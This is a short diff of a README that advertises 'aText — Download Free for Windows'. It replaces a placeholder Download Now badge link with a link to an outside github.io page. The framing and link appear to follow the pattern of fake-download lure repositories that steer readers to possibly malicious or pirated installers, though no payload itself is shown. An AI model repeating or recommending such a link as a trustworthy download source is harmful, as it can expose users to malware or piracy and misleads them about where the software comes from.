@@ -1,6 +1,6 @@
 # aText — Download Free for Windows
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](#)
+[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://atext-download.github.io/.github/)
 
 ---
 
